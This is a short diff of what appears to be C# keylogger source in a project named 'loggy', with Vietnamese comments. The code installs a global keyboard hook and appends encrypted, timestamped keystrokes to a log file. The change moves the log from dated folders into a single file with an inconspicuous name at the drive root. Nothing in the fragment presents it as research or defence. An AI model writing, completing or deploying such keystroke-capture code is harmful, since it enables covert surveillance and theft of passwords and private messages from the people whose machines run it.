@@ -28,7 +28,7 @@ namespace loggy
 
             string log = "";
 
-            Create_Folder_At_Midnight(new TimeSpan(00, 00, 00));
+            //Create_Folder_At_Midnight(new TimeSpan(00, 00, 00));
 
             _keyboardHook = new Y2KeyboardHook();
             _keyboardHook.Install();
@@ -159,12 +159,16 @@ namespace loggy
             // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
             string path_date = DateTime.Now.ToString("dd.MM");
 
-            Create_Folder();
+            //Create_Folder(); tạm bỏ
 
-            if (!File.Exists(path_date))
+            //if (!File.Exists(path_date)) tạm bỏ
             {
                 //File.Create(path);
-                using (StreamWriter sw = new StreamWriter(path_date + @"\" + path_date + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-
+
+                //tạm bỏ cái dưới để lưu vào 1 file duy nhất
+                //using (StreamWriter sw = new StreamWriter(path_date + @"\" + path_date + ".txt", true)) //nhớ thêm true để viết tiếp vào file, dkm -_-
+
+                using (StreamWriter sw = new StreamWriter(@"\abcxzy.txt", true))
                 {
                     sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
                 }
